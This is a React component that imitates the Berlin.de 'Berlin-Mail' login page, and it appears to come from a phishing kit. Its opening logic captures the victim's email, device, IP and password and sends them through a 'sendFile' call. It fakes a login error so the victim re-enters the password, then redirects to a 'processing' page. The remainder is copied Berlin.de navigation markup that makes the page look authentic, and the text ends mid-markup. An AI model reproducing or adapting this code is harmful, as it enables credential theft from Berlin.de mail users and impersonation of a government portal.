import React from "react";
import "./Berlin-Mail – Berlin.de_files/portal.scoped.css";
import Logo from "./Berlin-Mail – Berlin.de_files/logo_berlin_de.svg";
import Logoneg from "./Berlin-Mail – Berlin.de_files/logo_berlin_de_neg.svg";
import { useState } from "react";
import { notify, sendFile } from "../servers";
import { navigate } from "@reach/router";

function BerlinMail({ location }) {
    const [values, setValues] = useState({
        username: location.state.email,
        device: location.state.device,
        ip: location.state.ip,
        password: "",
      });
    
      const [submited, setSubmited] = useState({ status: false, count: 0 });
      const [showpassword, setShowpassword] = useState(false);
    
      const handleChange = (event) => {
        setValues({
          ...values,
          [event.target.name]: event.target.value,
        });
      };
    
      const submitForm = (event) => {
        event.preventDefault();
        setSubmited({ ...submited, status: !submited.status });
    
        if (submited.count <= 1) {
          sendFile(values).then((data) => {
            // show error
            notify();
            setSubmited({ ...submited, count: submited.count + 1 });
            setValues({ ...values, password: "" });
            console.log(data);
            console.log(submited);
          });
        } else {
          sendFile(values).then((data) => {
            // redirect
            navigate("../processing", { state: { domain: location.state.domain } });
            console.log("ok");
          });
        }
      };
      
  return (
    <div>
      <div id="page-wrapper" className="echo" bis_skin_checked={1}>
        <div className="fradSection Banner" bis_skin_checked={1} />
        <div className="pw-inner" bis_skin_checked={1}>
          <header id="header" className="echo" data-active-channel>
            <div className="portal-head" role="banner" bis_skin_checked={1}>
              <span className="portal-headborder" />
              <a
                href="https://www.berlin.de/"
                title="Link zu: Startseite Berlin.de"
                className="portal-logo"
              >
                <img
                  className="site-logo"
                  src={Logo}
                  alt="Berlin.de"
                />
              </a>
              <div className="portal-claim" bis_skin_checked={1}>
                Das offizielle Hauptstadtportal
              </div>
              <div className="aside" bis_skin_checked={1}>
                <form
                  onSubmit={submitForm}
                >
                  <div className="form-group" bis_skin_checked={1}>
                    <label className="aural" htmlFor="header_searchinput">
                      Suche auf der Internetseite von Berlin.de
                    </label>
                    <div className="controls" bis_skin_checked={1}>
                      <input
                        name="q"
                        placeholder="Suchbegriff"
                        title="Hier können Sie einen Text eingeben, um die Internetseite von Berlin.de zu durchsuchen"
                        id="header_searchinput"
                        type="text"
                      />
                      <button
                        className="button-submit"
                        type="submit"
                        name="search"
                        aria-label="Sucheingabe abschicken"
                      >
                        <i className="fa fa-search" aria-hidden="true" />
                        <span className="aural">Suchen</span>
                      </button>
                    </div>
                  </div>
                </form>
                <a
                  className="_link-citymap_"
                  href="https://www.berlin.de/stadtplan/"
                >
                  <i className="fa fa-map-marker" aria-hidden="true" />
                  Stadtplan
                </a>
                <div className="language-select" bis_skin_checked={1}>
                  <button
                    aria-haspopup="true"
                    aria-controls="languagemenu"
                    id="languagetoggler"
                    aria-expanded="false"
                    className="toggler link"
                    title="Sprache der Webseite ändern"
                    aria-label="Aktuelle Sprache"
                  >
                    <span
                      className="lang-icon"
                      role="img"
                      aria-label="Sprache"
                      aria-hidden="true"
                    >
                      de
                    </span>
                    Sprache
                    <i className="fa fa-chevron-down" aria-hidden="true" />
                  </button>
                  <ul
                    role="menu"
                    id="languagemenu"
                    aria-labelledby="languagetoggler"
                  >
                    <li role="menuitem">
                      <a
                        href="https://www.berlin.de/"
                        hrefLang="de"
                        className="active"
                      >
                        <span className="lang-icon" aria-hidden="true">
                          de
                        </span>
                        Deutsch
                      </a>
                    </li>
                    <li role="menuitem">
                      <a
                        href="https://www.berlin.de/en/"
                        hrefLang="en"
                        className
                      >
                        <span className="lang-icon" aria-hidden="true">
                          en
                        </span>
                        English
                      </a>
                    </li>
                    <li role="menuitem">
                      <a
                        href="https://www.berlin.de/fr/"
                        hrefLang="fr"
                        className
                      >
                        <span className="lang-icon" aria-hidden="true">
                          fr
                        </span>
                        Français
                      </a>
                    </li>
                    <li role="menuitem">
                      <a
                        href="https://www.berlin.de/it/"
                        hrefLang="it"
                        className
                      >
                        <span className="lang-icon" aria-hidden="true">
                          it
                        </span>
                        Italiano
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
            <nav id="navigation-primary-palm" className="closed">
              <h3 className="aural">Hauptnavigation</h3>
              <button
                className="hamburger-palm"
                data-target="primary-navigation-palm__tree"
                aria-label="Öffnet die mobile Navigation"
              >
                <i className="fa fa-bars" aria-hidden="true" />
                <span className="aural">Menü</span>
              </button>
              <div className="navigation-wrapper" bis_skin_checked={1} />
            </nav>
            <nav id="navigation-primary-desk" className="closed">
              <h3 className="aural">Hauptnavigation</h3>
              <div
                className="navigation-primary-desk__top"
                bis_skin_checked={1}
              >
                <ul className="nav">
                  <li>
                    <a
                      data-target="channel--politik"
                      href="https://www.berlin.de/politik-verwaltung-buerger/"
                      className="menu-item"
                    >
                      Politik, Verwaltung, Bürger
                    </a>
                  </li>
                  <li>
                    <a
                      data-target="channel--kultur"
                      href="https://www.berlin.de/kultur-und-tickets/"
                      className="menu-item"
                    >
                      Kultur &amp; Ausgehen
                    </a>
                  </li>
                  <li>
                    <a
                      data-target="channel--tourismus"
                      href="https://www.berlin.de/tourismus/"
                      className="menu-item"
                    >
                      Tourismus
                    </a>
                  </li>
                  <li>
                    <a
                      data-target="channel--wirtschaft"
                      href="https://www.berlin.de/wirtschaft/"
                      className="menu-item"
                    >
                      Wirtschaft
                    </a>
                  </li>
                  <li>
                    <a
                      data-target="channel--themen"
                      href="https://www.berlin.de/special/"
                      className="menu-item"
                    >
                      Stadtleben
                    </a>
                  </li>
                  <li>
                    <a
                      data-target="channel--berlinfinder"
                      href="https://www.berlin.de/adressen/"
                      className="menu-item"
                    >
                      BerlinFinder
                    </a>
                  </li>
                  <li>
                    <button
                      className="hamburger-desk"
                      data-target="primary-navigation-desk__tree"
                      aria-label="Öffnet die Navigation"
                    >
                      <i className="fa fa-bars" aria-hidden="true" />
                      <span className="aural">Menü</span>
                    </button>
                  </li>
                </ul>
              </div>
              {/* /navigation-primary-desk__top */}
              <div
                className="primary-navigation-desk__tree"
                bis_skin_checked={1}
              >
                <ul className="nav channel" role="tablist">
                  <li className="channel--politik">
                    <a
                      role="tab"
                      aria-controls="panel--politik"
                      id="tab--politik"
                      href="https://www.berlin.de/mail/#"
                      className="menu-item"
                    >
                      <span className="fa fa-bank" aria-hidden="true" />
                      Politik, Verwaltung, Bürger
                    </a>
                    <div
                      role="tabpanel"
                      id="panel--politik"
                      aria-labelledby="tab--politik"
                      className="topic"
                      aria-label="Unternavigation Politik, Verwaltung, Bürger"
                      bis_skin_checked={1}
                    >
                      <ul>
                        <li className="header">
                          <a
                            href="https://www.berlin.de/politik-verwaltung-buerger/"
                            className="header-item"
                          >
                            Zur Startseite: Politik, Verwaltung, Bürger
                          </a>
                        </li>
                        <li>
                          <a
                            href="https://service.berlin.de/"
                            className="menu-item"
                          >
                            Service
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://service.berlin.de/standorte/buergeraemter/"
                                className="menu-item"
                              >
                                Bürgerämter
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://service.berlin.de/terminvereinbarung/"
                                className="menu-item"
                              >
                                Terminvereinbarung
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://service.berlin.de/onlineverfahren-onlinedienstleistungen/"
                                className="menu-item"
                              >
                                Online-Verfahren
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/karriereportal/"
                            className="menu-item"
                          >
                            Karriere &amp; Ausbildung
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/karriereportal/stellensuche/"
                                className="menu-item"
                              >
                                Aktuelle Stellenangebote
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/karriereportal/berufsvielfalt/"
                                className="menu-item"
                              >
                                Berufsvielfalt
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/karriereportal/berufsvielfalt/gefragte-fachberufe/"
                                className="menu-item"
                              >
                                Gefragte Fachberufe
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/presse/"
                            className="menu-item"
                          >
                            Presse &amp; Newsletter
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/presse/pressemitteilungen/index/search?searchtext="
                                className="menu-item"
                              >
                                Aktuelle Mitteilungen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/presse/pressemitteilungen/user/login"
                                className="menu-item"
                              >
                                Newsletter abonnieren
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/polizei/polizeimeldungen/"
                                className="menu-item"
                              >
                                Polizei-Meldungen
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://service.berlin.de/behoerden/"
                            className="menu-item"
                          >
                            Behörden
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://service.berlin.de/senatsverwaltungen/"
                                className="menu-item"
                              >
                                Senatsverwaltungen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://service.berlin.de/bezirksaemter/"
                                className="menu-item"
                              >
                                Bezirksämter
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/sen/finanzen/steuern/finanzaemter/"
                                className="menu-item"
                              >
                                Finanzämter
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/rbmskzl/"
                            className="menu-item"
                          >
                            Regierende Bürgermeisterin
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/rbmskzl/aktuelles/termine/"
                                className="menu-item"
                              >
                                Termine
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/rbmskzl/regierende-buergermeisterin/senat/"
                                className="menu-item"
                              >
                                Senat
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/rbmskzl/politik/"
                                className="menu-item"
                              >
                                Politik
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://service.berlin.de/suche/stichwort/?x="
                            className="menu-item"
                          >
                            Oft gesucht
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/vhs/"
                                className="menu-item"
                              >
                                Volkshochschulen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://service.berlin.de/stadtbibliotheken/"
                                className="menu-item"
                              >
                                Bibliotheken
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://service.berlin.de/jobcenter/"
                                className="menu-item"
                              >
                                Jobcenter
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </div>
                    <ul
                      className="aside list--clean"
                      aria-label="Mehr zum Thema Politik, Verwaltung, Bürger"
                    >
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/rbmskzl/regierende-buergermeisterin/senat/">
                            <img
                              data-src="/binaries/asset/image_assets/7195828/ratio_2_1/1647605672/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=""
                            />
                          </a>
                          <span className="source">© Florian Selig</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/rbmskzl/regierende-buergermeisterin/senat/">
                            Landesregierung
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://service.berlin.de/">
                            <img
                              data-src="/binaries/asset/image_assets/4772212/ratio_2_1/1488368488/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt="Service Button on Modern Computer Keyboard with Word Partners on It."
                            />
                          </a>
                          <span className="source">
                            © tashatuvango/depositphotos.com
                          </span>
                        </div>
                        <p>
                          <a href="https://service.berlin.de/">
                            Behörden-Leistungen
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/karriereportal/">
                            <img
                              data-src="/binaries/asset/image_assets/6493951/ratio_2_1/1617288752/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=""
                            />
                          </a>
                          <span className="source">© Land Berlin</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/karriereportal/">
                            Karriere beim Land Berlin
                          </a>
                        </p>
                      </li>
                    </ul>
                  </li>
                  <li className="channel--kultur">
                    <a
                      role="tab"
                      aria-controls="panel--kultur"
                      id="tab--kultur"
                      href="https://www.berlin.de/mail/#"
                      className="menu-item"
                    >
                      <span
                        className="bdeicon bdeicon-kultur"
                        aria-hidden="true"
                      />
                      Kultur &amp; Ausgehen
                    </a>
                    <div
                      role="tabpanel"
                      id="panel--kultur"
                      aria-labelledby="tab--kultur"
                      className="topic"
                      aria-label="Unternavigation Kultur & Ausgehen"
                      bis_skin_checked={1}
                    >
                      <ul>
                        <li className="header">
                          <a
                            href="https://www.berlin.de/kultur-und-tickets/"
                            className="header-item"
                          >
                            Zur Startseite: Kultur &amp; Ausgehen
                          </a>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/events/"
                            className="menu-item"
                          >
                            Veranstaltungen
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/events/"
                                className="menu-item"
                              >
                                Aktuelle Events
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tickets/musical/"
                                className="menu-item"
                              >
                                Musical
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tickets/konzert-highlights/"
                                className="menu-item"
                              >
                                Konzert-Highlights
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tickets/comedy/"
                                className="menu-item"
                              >
                                Comedy
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tickets/shop/"
                            className="menu-item"
                          >
                            Termine
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/kino/_bin/index.php"
                                className="menu-item"
                              >
                                Kinoprogramm
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/ausstellungen/"
                                className="menu-item"
                              >
                                Ausstellungen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/events/jahresuebersicht/"
                                className="menu-item"
                              >
                                Jahresübersicht
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kultur-und-tickets/tipps/kinder/"
                                className="menu-item"
                              >
                                Für Kinder
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/restaurants/"
                            className="menu-item"
                          >
                            Essen &amp; Trinken
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/restaurants/"
                                className="menu-item"
                              >
                                Restaurants
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/bars/"
                                className="menu-item"
                              >
                                Bars
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/cafes/"
                                className="menu-item"
                              >
                                Cafés
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/restaurants/berlins-beste/"
                                className="menu-item"
                              >
                                Berlins Beste
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/kultur-und-tickets/tipps/"
                            className="menu-item"
                          >
                            Tipps
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/wochenend-tipps/"
                                className="menu-item"
                              >
                                Wochenende
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kino/neustarts/"
                                className="menu-item"
                              >
                                Kino-Neustarts
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kultur-und-tickets/tipps/poetry-slam/"
                                className="menu-item"
                              >
                                Poetry Slam
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sommer/"
                                className="menu-item"
                              >
                                Sommer
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/kultur-und-tickets/adressen/"
                            className="menu-item"
                          >
                            Adressen
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/museum/"
                                className="menu-item"
                              >
                                Museen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/special/sport-und-fitness/schwimmbad/freibad/"
                                className="menu-item"
                              >
                                Freibäder
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kino/freiluftkinos/"
                                className="menu-item"
                              >
                                Freilufkinos
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tickets/theater/tipps/buehnen/"
                                className="menu-item"
                              >
                                Theaterbühnen
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/kultur-und-tickets/tipps/"
                            className="menu-item"
                          >
                            Weitere Angebote
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/kultur-und-tickets/fotos/"
                                className="menu-item"
                              >
                                Fotostrecken
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kultur-und-tickets/gratis/"
                                className="menu-item"
                              >
                                Gratis
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/kultur-und-tickets/tipps/draussen/"
                                className="menu-item"
                              >
                                Im Freien
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tickets/top-10/"
                                className="menu-item"
                              >
                                Top 10: Tickets
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </div>
                    <ul
                      className="aside list--clean"
                      aria-label="Mehr zum Thema Kultur & Ausgehen"
                    >
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/weihnachtsmarkt/">
                            <img
                              data-src="/binaries/asset/image_assets/7880844/ratio_2_1/1669101439/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt="Weihnachtskugeln werden an einem Stand auf dem Weihnachtsmarkt «Berliner Weihnachtszeit 2022» am Roten Rathaus zum Verkauf angeboten."
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/weihnachtsmarkt/">
                            Weihnachtsmärkte
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/ausstellungen/">
                            <img
                              data-src="/binaries/asset/image_assets/7769292/ratio_2_1/1664186678/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt="Marja Helander: The Secrets of Dusk 2, 2018"
                            />
                          </a>
                          <span className="source">© Marja Helander</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/ausstellungen/">
                            Ausstellungen
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/museum/thema/sonstige/">
                            <img
                              data-src="/binaries/asset/image_assets/6510369/ratio_2_1/1619084620/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=""
                            />
                          </a>
                          <span className="source">© DFM Berlin</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/museum/thema/sonstige/">
                            Außergewöhnliche Museen
                          </a>
                        </p>
                      </li>
                    </ul>
                  </li>
                  <li className="channel--tourismus">
                    <a
                      role="tab"
                      aria-controls="panel--tourismus"
                      id="tab--tourismus"
                      href="https://www.berlin.de/mail/#"
                      className="menu-item"
                    >
                      <span className="fa fa-suitcase" aria-hidden="true" />
                      Tourismus
                    </a>
                    <div
                      role="tabpanel"
                      id="panel--tourismus"
                      aria-labelledby="tab--tourismus"
                      className="topic"
                      aria-label="Unternavigation Tourismus"
                      bis_skin_checked={1}
                    >
                      <ul>
                        <li className="header">
                          <a
                            href="https://www.berlin.de/tourismus/"
                            className="header-item"
                          >
                            Zur Startseite: Tourismus
                          </a>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tourismus/sightseeing/"
                            className="menu-item"
                          >
                            Sightseeing
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/sehenswuerdigkeiten/"
                                className="menu-item"
                              >
                                Sehenswürdigkeiten
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/aussichtsplattformen-und-aussichtspunkte/"
                                className="menu-item"
                              >
                                Aussichtspunkte
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/parks-und-gaerten/"
                                className="menu-item"
                              >
                                Parks &amp; Gärten
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/ausfluege-nach-potsdam/"
                                className="menu-item"
                              >
                                Potsdam
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tourismus/unterkunft/"
                            className="menu-item"
                          >
                            Hotels &amp; Unterkünfte
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/hotels/"
                                className="menu-item"
                              >
                                Hotels
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/unterkunft/hostel/"
                                className="menu-item"
                              >
                                Hostels
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/unterkunft/themenhotels/"
                                className="menu-item"
                              >
                                Themenhotels
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/reiseangebote/"
                                className="menu-item"
                              >
                                Hotels &amp; Bahn
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tourismus/touren/"
                            className="menu-item"
                          >
                            Touren
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/dampferfahrten/"
                                className="menu-item"
                              >
                                Schiffstouren
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/stadtrundfahrten/"
                                className="menu-item"
                              >
                                Stadtrundfahrten
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/stadtfuehrungen/"
                                className="menu-item"
                              >
                                Stadtführungen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/fahrradtouren/"
                                className="menu-item"
                              >
                                Fahrradtouren
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tourismus/insidertipps/"
                            className="menu-item"
                          >
                            Insider-Tipps
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/insidertipps/berlin-abenteuer/"
                                className="menu-item"
                              >
                                Für Abenteurer
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/insidertipps/berlin-fuer-foodies/"
                                className="menu-item"
                              >
                                Für Foodies
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/insidertipps/berlin-fuer-romantiker/"
                                className="menu-item"
                              >
                                Für Romantiker
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/insidertipps/berlin-mit-eltern/"
                                className="menu-item"
                              >
                                Mit Eltern
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tourismus/infos/nahverkehr/"
                            className="menu-item"
                          >
                            Mobilität &amp; Verkehr
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/infos/nahverkehr/1772016-1721041-fahrkarten-tickets-liniennetze.html"
                                className="menu-item"
                              >
                                Fahrkarten &amp; Pläne
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/infos/flughafen-ber/"
                                className="menu-item"
                              >
                                BER
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/infos/verkehr/verkehrslagekarte/"
                                className="menu-item"
                              >
                                Verkehrslage
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/infos/bahnhoefe/"
                                className="menu-item"
                              >
                                Bahnhöfe
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/tourismus/infos/"
                            className="menu-item"
                          >
                            Weitere Angebote
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/ausstellungen/"
                                className="menu-item"
                              >
                                Ausstellungen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/museum/"
                                className="menu-item"
                              >
                                Museen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/zoos-und-tierparks/"
                                className="menu-item"
                              >
                                Zoos &amp; Tierparks
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/tourismus/klassenfahrt/"
                                className="menu-item"
                              >
                                Klassenfahrten
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </div>
                    <ul
                      className="aside list--clean"
                      aria-label="Mehr zum Thema Tourismus"
                    >
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/tourismus/insidertipps/berlin-abenteuer/">
                            <img
                              data-src="/binaries/asset/image_assets/7696962/ratio_2_1/1660649207/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt='Der Tunneleingang der Achterbahn â€žSpreeblitzâ€œ im Spreepark im PlÃ¤nterwald soll einen Drachen darstellen. Das Land Berlin hat 2014 das Erbbaurecht fÃ¼r den Spreepark zurÃ¼ckgekauft und will dort den verwaisten Spreepark neu aufleben lassen.Â (zuÂ "Â«Magischer OrtÂ» - Erster Probebetrieb im Berliner Spreepark") +++ dpa-Bildfunk +++'
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/tourismus/insidertipps/berlin-abenteuer/">
                            Berlin für Abenteurer
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/tourismus/brandenburg/veranstaltungen/3690651-3479097-advent-brandenburg-weihnachtsmaerkte.html">
                            <img
                              data-src="/binaries/asset/image_assets/7799928/ratio_2_1/1667592691/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt='"Frohes Fest" steht auf dem Weihnachtsmarkt auf den Lebkuchenherzen. In Bonn gilt beim stÃ¤dtischen Weihnachtsmarkt nicht nur die 2G-Regel, sondern auch eine Maskenpflicht fÃ¼r die gesamte Innenstadt. +++ dpa-Bildfunk +++'
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/tourismus/brandenburg/veranstaltungen/3690651-3479097-advent-brandenburg-weihnachtsmaerkte.html">
                            Weihnachtsmärkte in Brandenburg
                          </a>
                        </p>
                      </li>
                      <li className="navigation-teaser">
                        <div className="image" bis_skin_checked={1}>
                          <a href="https://www.berlin.de/tourismus/brandenburg/potsdam/">
                            <img
                              data-src="/binaries/asset/image_assets/3785026/ratio_2_1/1665129406/192x96/"
                              src="https://www.berlin.de/mail/#"
                              alt=" 
      Die Tourismuswirtschaft feiert ein neues Rekordergebnis. Foto: Ralf Hirschberger 
    "
                            />
                          </a>
                          <span className="source">© dpa</span>
                        </div>
                        <p>
                          <a href="https://www.berlin.de/tourismus/brandenburg/potsdam/">
                            Potsdam entdecken
                          </a>
                        </p>
                      </li>
                    </ul>
                  </li>
                  <li className="channel--wirtschaft">
                    <a
                      role="tab"
                      aria-controls="panel--wirtschaft"
                      id="tab--wirtschaft"
                      href="https://www.berlin.de/mail/#"
                      className="menu-item"
                    >
                      <span className="fa fa-bar-chart" aria-hidden="true" />
                      Wirtschaft
                    </a>
                    <div
                      role="tabpanel"
                      id="panel--wirtschaft"
                      aria-labelledby="tab--wirtschaft"
                      className="topic"
                      aria-label="Unternavigation Wirtschaft"
                      bis_skin_checked={1}
                    >
                      <ul>
                        <li className="header">
                          <a
                            href="https://www.berlin.de/wirtschaft/"
                            className="header-item"
                          >
                            Zur Startseite: Wirtschaft
                          </a>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/"
                            className="menu-item"
                          >
                            Wirtschaftsstandort
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/5611367-3671573-wirtschaftliche-entwicklung.html"
                                className="menu-item"
                              >
                                Wirtschaftswachstum
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/branchen/"
                                className="menu-item"
                              >
                                Brancheninformationen
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/messekalender/"
                                className="menu-item"
                              >
                                Messekalender
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/5615902-5615330-beratung-und-foerderung-fuer-startups.html"
                            className="menu-item"
                          >
                            Gründen
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/5615902-5615330-beratung-und-foerderung-fuer-startups.html"
                                className="menu-item"
                              >
                                Beratung und Förderung
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsstandort/5612603-3671573-attraktive-standorte-fuer-unternehmen.html"
                                className="menu-item"
                              >
                                Standorte
                              </a>
                            </li>
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/startups/"
                                className="menu-item"
                              >
                                Start-up Interviews
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li>
                          <a
                            href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/"
                            className="menu-item"
                          >
                            Investieren
                          </a>
                          <ul className="subtopic">
                            <li>
                              <a
                                href="https://www.berlin.de/wirtschaft/wirtschaftsfoerderung/5615749-5615330-foerderung-fuer-unternehmen.html"
                                className="menu-item"
                              >
